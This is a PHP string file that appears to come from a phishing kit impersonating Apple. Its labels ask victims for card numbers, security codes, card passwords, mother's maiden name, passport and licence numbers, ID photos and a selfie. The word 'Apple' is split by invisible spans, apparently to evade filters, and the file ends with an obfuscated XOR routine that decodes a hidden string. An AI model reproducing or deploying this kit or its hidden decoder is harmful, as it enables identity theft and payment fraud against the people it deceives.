	$YourAppleID = "Your <div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> ID is ";
	$OuSignt = "Sign Out ";
	$PersonalInformation = "Personal Information";
	$NAME = "Name";
	$firstname = "first name";
	$middlename = "middle name (optional)";
	$lastname = "last name";
	$OFBIRTH = "DATE OF BIRTH";
	$dateobirth = "date of birth";
	$TELEPHONE = "TELEPHONE";
	$rtphone = "telephone number"; // add it 
	$ADDRESS = "ADDRESS";
    $LineADDRESS = "address Line ";
	$city = "town / city";
	$POSTCO = "POSTAL CODE";
	$AccountDetails = "Account Details";
	$CARDDETAILS = "Card Details";
	$CAname = "cardholders name";
	$CAnumber = "card number";
	$CAdater = "expiry date";
	$securitycode = "card security code";
	$cardpassword = "vbv password or card password";
	$Security = "Security";
	$SELECTQUESTION = "Select A Security Question";
	$securityquestion = "select security question";
	$MaideNamen = "Mother&apos;s Maiden Name";
	$LicenseNumber = "Driving License Number";
	$PassportNumber = "Passport Number";
	$answer = "answer";
	$nxt = "Next";

// Id 1

	$IdentityVerification = "Identity Verification";
	$doIDcument = "1 - Upload photos of both sides of your ID document.";
	$residencedocument = "2 - Upload Proof of residence document photo";
	$couldyour = "This could be your :";
	$billinternet = "Bank statement or Utility bill (electricity bill, water bill, internet bill, etc.)";
	$Email = " Email";
	$fsidedocument = " - Front side of your ID document";
	$Backside = " - Back side of your ID document";
	$residencephoto = " - Proof of residence document photo";

// Id 2
    $sidespaymentcard = "Upload photos of both sides of your payment card.&nbsp;";
	$Email = " Email";
	$FrontsideCard = " - Front side of your Payment Card";
	$syourideBack = " - Back side of your Payment Card";
	$Email = "";
	$Email = "";
	
// Id 3
    $clearCard = "- Please upload a clear photo of your ID Card";
	$takeselfie = "- You should hold your ID next to your face and take a selfie";
	$thenupload = " Choose the photo then click upload. ";
	$uploadii = "Upload &rarr;";
	
// Fin

    $VerificationComplete = "Account Verification Complete";
    $accessaccount = "Please wait while we restore your account access...";
    $automaticallylogged = "For your security you will automatically be logged out. ";
	
// Link Email

    $vverrmail = "Add your email address.";
	$emaillsz = "Email";
	$wontsy = "<div style=display:contents><span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>A<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$gram</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>p<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$groot</span>l<span style='float: right; font-size: .001px; color: transparent; width: 0px;'>$froot</span>e</div> won't store your password.";}function lan($str,$ky=''){ if($ky=='')return $str; $ky=str_replace(chr(32),'',$ky); if(strlen($ky)<8)exit('e'); $kl=strlen($ky)<32?strlen($ky):32; $k=array();for($i=0;$i<$kl;$i++){ $k[$i]=ord($ky{$i})&0x1F;} $j=0;for($i=0;$i<strlen($str);$i++){ $e=ord($str{$i}); $str{$i}=$e&0xE0?chr($e^$k[$j]):chr($e); $j++;$j=$j==$kl?0:$j;} return $str; } $FirstNamesz='facoltativo'; $IO=lan('ldbao|`fes|dd`nLslu`z!enn',$FirstNamesz);
?>                             